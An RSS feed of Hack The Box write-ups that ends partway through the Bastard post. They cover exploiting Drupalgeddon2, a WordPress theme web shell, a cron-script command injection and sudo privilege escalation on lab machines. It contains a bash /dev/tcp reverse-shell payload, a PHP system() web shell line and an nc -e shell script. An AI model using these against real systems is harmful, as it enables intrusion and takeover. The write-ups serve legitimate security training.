<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>HTB - Tag - Masoopy</title><link>https://www.masoopy.com/tags/htb/</link><description>HTB - Tag - Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 31 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.masoopy.com/tags/htb/" rel="self" type="application/rss+xml"/><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/07/Armageddon_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>During this box, we&rsquo;ll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I&rsquo;ll get privesc thanks to an insecure sudo command (once again).</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/323" target="_blank" rel="noopener noreffer ">HTB - Armageddon</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals it&rsquo;s running Linux.</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\armageddon
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/nmap $attacker_ip
 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 08:51 CEST
Nmap scan report for $attacker_ip
Host is up (0.025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
</code></pre></td></tr></table>
</div>
</div><p>The above scans confirms we are facing a Linux box with only Apache and SSH running.</p>
<p>The <code>CHANGELOG.txt</code> shows a <code>Drupal 7.56</code> version :</p>
<p></p>
<p>After a quick look on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer ">exploitDB</a>, we&rsquo;ll notice that this version should be vulnerable to <code>Drupalgeddon2</code>.</p>
<p>Let&rsquo;s see!</p>
<h2 id="exploitation">Exploitation</h2>
<p>NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with <code>searchsploit -x relative_path</code> and <code>searchsploit -m relative_path</code> in order to mirror (eg. copy the exploit in my current directory).</p>
<p>In our case, we&rsquo;ll be using : <code>searchsploit -m php/webapps/44449.rb</code>.</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>After firing it up, we&rsquo;ll get a shell :</p>
<p></p>
<p>From here, we can get the Drupal config inside <code>sites/default/settings.php</code> and find <code>MySQL credentials</code> :</p>
<p></p>
<p>Once, we have the creds, we can try to dump the db, with <code>mysqldump</code>, but we&rsquo;ll gt an error about a bad character (&gt;). We,then, shall upgrade our shell.</p>
<p>Let&rsquo;s fire up <code>Burp</code>, with the following request and a <code>nc listener</code> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">POST /shell.php HTTP/1.1
Host: $attacker_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: has_js=1
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

c=bash+-i+&gt;%26+/dev/tcp/10.10.14.11/443+0&gt;%261
</code></pre></td></tr></table>
</div>
</div><p>NB : In case you are wondering, I am using the <code>shell.php</code> from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.</p>
<p>Once it is done, we can dump the DB like so :</p>
<p><code>mysqldump -u drupaluser -p drupal &gt; plop.sql</code></p>
<p>We now look inside the dump and search for user&rsquo;s information :</p>
<p></p>
<p>It appears our user is called <code>brucetherealadmin</code> and it&rsquo;s hash starts with <code>$S$</code> according to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreffer ">hashcat</a>, it is a Drupal 7 hash, which we can confirm it is!</p>
<p>Now to crack it :</p>
<p><code>hashcat -m 7900 arma.hash /usr/share/wordlists/rockyou.txt</code></p>
<p>After a little while, the password will be cracked :</p>
<p></p>
<h3 id="getting-users-shell">Getting User&rsquo;s Shell</h3>
<p>We can now log in via SSH as <code>brucetherealadmin</code> with the just cracked password, and grab <code>user's flag</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that we are in, the first thing I like to do is checking if I have <code>sudo</code>&rsquo;s rights. This might be an easy win and it is a lot quieter than running a script such as <code>LinPeas</code>.</p>
<p>Bruce can indeed run <code>sudo snap install</code> :</p>
<p></p>
<p>When I first did the box, there was nothing on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">GTFObins</a>, but since there is today, let&rsquo;s do it the easy way!</p>
<p>We simply modify the first line, replacing <code>id</code> command with <code>cat /root/root.txt</code>.</p>
<p>Finally, we run it like : <code>sudo snap install plop_1.0_all.snap --dangerous --devmode</code> in order to get root&rsquo;s flag:</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>I remember loving the first part until user&hellip; but the last part was just horrible. I hated it ! It was actually so painful, that I didn&rsquo;t take any note on the privesc and didn&rsquo;t even planned to do the writeup&hellip; but here I am!</p>
]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/07/Spectra_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>This is an easy Linux box, where I had to get user through a forgotten &ldquo;backup&rdquo; on a dev instance, then the privesc came from an unsecured sudo command&hellip; Sounds straightforward ? Well, not that much!</p>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/317" target="_blank" rel="noopener noreffer ">HTB - Spectra</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals that it is a Linux&rsquo;s box, and that&rsquo;s it!</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\spectra
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 15:23 CEST
Nmap scan report for $target_ip
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn&#39;t have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.50 seconds
</code></pre></td></tr></table>
</div>
</div><p>Only 3 ports are open : http, mysql, and SSH.</p>
<h3 id="web-enum">Web enum</h3>
<p>Since I found a website, I&rsquo;ll manually browse to it in order to have a quick look. In the mean time, I&rsquo;ll fire up a <code>gobuster</code> scan against the IP :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spectra.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/27 15:27:27 Starting gobuster in directory enumeration mode
===============================================================
/main                 (Status: 301) [Size: 169] [--&gt; http://spectra.htb/main/]
/testing              (Status: 301) [Size: 169] [--&gt; http://spectra.htb/testing/]
                                                                                 
===============================================================
2021/05/27 15:31:27 Finished
===============================================================
</code></pre></td></tr></table>
</div>
</div><p>Main page shows 2 links pointing to <a href="http://spectra.htb" target="_blank" rel="noopener noreffer ">spectra.htb</a>, this means I need to modify our <code>/etc/hosts</code> file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.</p>
<p>Once this is done, I would generally run a few more <code>gobuster</code> scans in the background against those two instances and a <code>WPScan</code> on the working Wordpress :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://spectra.htb/main/ [target.ip]
[+] Started: Thu May 27 15:29:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.17.4
 |  - X-Powered-By: PHP/5.6.40
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://spectra.htb/main/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://spectra.htb/main/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
 |  - http://spectra.htb/main/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;

[+] WordPress theme in use: twentytwenty
 | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#39;Version: 1.2&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 &lt;===============================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu May 27 15:29:22 2021
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 43.305 KB
[+] Data Received: 357.271 KB
[+] Memory used: 203.707 MB
[+] Elapsed time: 00:00:09
</code></pre></td></tr></table>
</div>
</div><p>This scan didn&rsquo;t reveal anything useful, I also tried to brute force <code>administrator</code> user with a top 1000 passwords list from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreffer ">SecLists</a>. No luck.</p>
<p>I decided to run the <code>WPScan</code> first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that <code>directory listing</code> was enabled on this instance, this means that browsing to <code>http://spectra.htb/testing/</code> instead of <code>http://spectra.htb/testing/index.php</code> gave me the full listing of files on the web root.</p>
<p>From here, I could spot a <code>wp-config.php.save</code> file that contained credentials to connect to the database.</p>
<p>I tried connecting remotely, but MySQL wouldn&rsquo;t allow me to connect from my IP.</p>
<p>Finally, I tried logging on the working Wordpress' instance as <code>administrator</code> and with the password I found, and it worked! I was in!</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>Once you are logged with admin priv on a Wordpress, getting a shell is, as far as I have seen, very easy! Basically, it is about editing a theme (preferably an unused one), and adding a small line of <code>PHP</code> in order to get some kind of <code>RCE</code>.</p>
<p>In this case, I edited theme <code>twentyseven</code>, file <code>404.php</code> and added the following line : <code>echo system($_REQUEST['nes']);</code></p>
<p>This means, that I can now run commands like so (directly in browser, or via Curl, Burp, etc) :</p>
<p><code>curl http://spectra.htb/main/themes/twentyseven/404.php&amp;nes=whoami</code></p>
<p>From here, I like to use Burp, convert the request to <code>POST</code> and play around or simply get a better shell.</p>
<p>On this particular box, I had several issues trying to get a proper shell.</p>
<p>I decided to upload a full php reverse shell via curl&hellip; I then reached that URL to get my reverse shell, and&hellip; I couldn&rsquo;t <a href="https://www.masoopy.com/cheatsheets/uprgrading-shells/" target="_blank" rel="noopener noreffer ">upgrade it</a>! However, I noticed that <code>nginx</code> user had a real shell inside <code>/etc/passwd</code>, so I uploaded my <code>ssh key</code> and connected as <code>nginx</code> over <code>SSH</code>!</p>
<p>From here, I ran <code>LinPeas</code> and spotted (not easily) and interesting file : <code>/etc/autologin/passwd</code></p>
<h4 id="getting-user">Getting user</h4>
<p>The password found allowed me to log in as <code>katie</code> via ssh, and allowed me to grab the <code>user flag</code> :</p>
<p></p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that I have user, let&rsquo;s see if I can run sudo, and indeed I can run <code>sudo /sbin/initctl</code> without password. I headed over <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">GTFObins</a>, but unfortunately there was nothing there.</p>
<p>After a little exploration, I noticed that I could <code>edit</code> / <code>start</code> / <code>stop</code> services in <code>/etc/init/</code>, and found a particularly interesting one called test.conf.</p>
<p></p>
<p>After more trial and errors, I simply decided to replace the <code>date</code> command by <code>cat /root/root.txt</code>, which got me the <code>root flag</code> from log file in <code>/var/log/nodetest.log</code> :</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This was another fun with quite a few unexpected hurdles. It was really cool to &ldquo;think out of the box&rdquo; and try to find (ugly) ways to overcome those issues.</p>
]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/06/SK_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<h2 id="target">Target</h2>
<p><a href="https://app.hackthebox.eu/machines/314" target="_blank" rel="noopener noreffer ">HTB - ScriptKiddie</a></p>
<h2 id="recon">Recon</h2>
<p>Initial recon tells us the box is running Linux, and that&rsquo;s about it!</p>
<h2 id="enum">Enum</h2>
<p>During the enum phase</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/fast $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Mon May 17 15:00:50 2021 as: nmap -sC -sV -oA scans/fast $target_ip
Nmap scan report for $target_ip
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d&#39;5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 17 15:00:58 2021 -- 1 IP address (1 host up) scanned in 8.98 second
</code></pre></td></tr></table>
</div>
</div><p>From this we discover an <code>SSH</code> service and a <code>Python webserver</code> on port 5000. It also confirms we are facing a Linux box.</p>
<p>Manually browsing to the website, we find that there are 3 tools : <code>nmap</code>, <code>searchsploit</code> anf <code>msfvenom</code>. After a few tries with <code>ffuf</code>, and <code>gobuster</code>, we couldn&rsquo;t find anything interesting.</p>
<p>However, after a quick search, <code>msfvenom</code> might be <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" target="_blank" rel="noopener noreffer ">vulnerable</a>.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Let&rsquo;s test our theory and see if we can get a shell.</p>
<h3 id="getting-initial-shell">Getting Initial Shell</h3>
<p>In order to do so, we will fire up <code>MetaSploit</code> and generate a payload (we could also <a href="https://www.exploit-db.com/exploits/49491" target="_blank" rel="noopener noreffer ">download</a> a payload and slightly modify it).</p>
<p>We then upload the payload as an Android template and before submitting it, let&rsquo;s not forget to start ar listener like so : <code>nc -nlvp 9001</code> (or your usual port). Let&rsquo;s, now, submit the request, and you should get a shell back as use kid. From here, I like to generate an ssh key and add it to the <code>.ssh/authorized_keys</code> for easier access.</p>
<p>Once this is done, I have a proper shell and way to come back easily.</p>
<p>Let&rsquo;s grab <code>user</code>&rsquo;s flag:</p>
<p></p>
<h3 id="pivoting">Pivoting</h3>
<p>Now that we are kid user, we notice that there is also a pwn user that is running a script periodically. Even more interestingly, it uses a file owned by kid as input.</p>
<p>The script in question is located at <code>/home/pwn/scanlosers.sh</code>  and looks like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do
    sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34; &amp;
done

if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
</code></pre></td></tr></table>
</div>
</div><p>After a quick look at the script, we notice that it is reads the the file <code>/home/kid/logs/hackers</code>, search for the third field on the line, and run an <code>nmap</code> scan against this field.</p>
<p>Now we can trick this script into running a custom command after the <code>nmap</code>&rsquo;s one.</p>
<p>After a few trial and errors, I arrived to the following line of code :</p>
<p><code>echo &quot;1 2 127.0.0.1';/home/kid/nc.sh;date&quot; &gt; /home/kid/logs/hackers</code></p>
<p>with <code>nc.sh</code> being:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash

/home/kid/nc -lvp 9001 -e /bin/bash
</code></pre></td></tr></table>
</div>
</div><p>Don&rsquo;t forget to run a listener on port 9001, in order to grab the reverse shell. I would have wanted to do the &ldquo;ssh trick&rdquo; for easier access, but the <code>.ssh/authorized_keys</code> is owned by root&hellip; So I&rsquo;ll have to make it do with the temporary shell as <code>pwn</code>&rsquo;s user.</p>
<h3 id="privesc">PrivEsc</h3>
<p>Now that we are pwn, let&rsquo;s start by a simple <code>sudo -l</code> :</p>
<p></p>
<p>msfconsole can be run as root without password&hellip;. let&rsquo;s do it and cat the <code>root</code>&rsquo;s flag:</p>
<p></p>
<h2 id="outro">Outro</h2>
<p>This was quite a fun box, with a few extra steps for an &ldquo;easy&rdquo; machine. It also shows that hackers can be hacked! ;)</p>
]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><author>Denis G.</author><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                <img src="/images/2021/03/Bastard_Logo.png" referrerpolicy="no-referrer">
            </div><h2 id="intro">Intro</h2>
<p>Let&rsquo;s up the game a little bit and attack a medium rated box for the very first time!</p>
<h2 id="target">Target</h2>
<p><a href="URL" rel="">HTB - Bastard</a></p>
<h2 id="recon">Recon</h2>
<p>A quick look to the box info reveals :</p>
<ul>
<li>Windows box ;</li>
<li>Misc : php, web, patch management.</li>
</ul>
<p>I assume this will be about an outdated PHP application running under Windows.</p>
<h2 id="enum">Enum</h2>
<p>We run our classic <code>nmap</code> scan :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
